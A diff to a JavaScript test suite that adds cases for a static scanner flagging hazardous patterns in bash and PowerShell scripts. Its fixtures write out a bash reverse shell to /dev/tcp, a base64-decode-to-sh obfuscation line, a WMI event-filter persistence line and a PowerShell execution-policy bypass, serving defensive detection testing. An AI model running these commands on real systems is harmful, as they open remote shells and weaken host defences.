@@ -1342,7 +1342,9 @@ function mockFetchCapture(payload, status = 200) {
   check("detectTypeDetail 无特征 → instructions + none 理由",
     [dtNone.type, dtNone.reasonKey, dtNone.hintKey],
     ["instructions", "detectReason.none", "detectHint.none"]);
-  // 8. 脚本静态危险模式扫描（discussion #2269 承诺项，四类模式）
+  // 8. 脚本静态危险模式扫描（discussion #2269 承诺项；2026-08 规则集扩充：
+  //    按语言分表 bash/ps1 + 共享凭据字典，语义参考 ShellCheck/PSScriptAnalyzer/
+  //    Semgrep command-injection/GuardDog 启发式）
   const hazDir = join(process.env.DSH_HOME, "hazard-fixtures");
   const mkHaz = (name, content) => {
     const f = join(hazDir, name);
@@ -1367,6 +1369,23 @@ function mockFetchCapture(payload, status = 200) {
   ].join("\n")));
   check("scanScriptHazards ps1 三类命中", ps1Hits.map((h) => h.category),
     ["downloadExec", "pathStartup", "credRead"]);
+  // 新规则覆盖：混淆/外泄/持久化（每类抽代表）
+  const shObf = await lib.scanScriptHazards(mkHaz("obf.sh", [
+    "echo " + "Q2xpY2tIZXJlVG9Eb3dubG9hZE1hbHdhcmVQYXlsb2Fk" + " | base64 -d | sh"
+  ].join("\n")));
+  check("sh base64 管道混淆命中 obfuscation", shObf.map((h) => h.category), ["obfuscation"]);
+  const shExfil = await lib.scanScriptHazards(mkHaz("exfil.sh", [
+    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+  ].join("\n")));
+  check("sh 反向 shell 命中 exfil", shExfil.map((h) => h.category), ["exfil"]);
+  const ps1Persist = await lib.scanScriptHazards(mkHaz("persist.ps1", [
+    "__EventFilter Name=EvilFilter"
+  ].join("\n")));
+  check("ps1 WMI 事件订阅命中 pathStartup", ps1Persist.map((h) => h.category), ["pathStartup"]);
+  const ps1Dyn = await lib.scanScriptHazards(mkHaz("dyn.ps1", [
+    "Set-ExecutionPolicy Bypass -Scope Process"
+  ].join("\n")));
+  check("ps1 执行策略绕过命中 dynamicExec", ps1Dyn.map((h) => h.category), ["dynamicExec"]);
   check("scanScriptHazards 干净脚本无命中",
     (await lib.scanScriptHazards(mkHaz("clean.ps1", "Write-Host 'hi'\nNew-Item -Path ./out\n"))).length, 0);
   check("scanScriptHazards 文件缺失返回空", (await lib.scanScriptHazards(join(hazDir, "nope.sh"))).length, 0);
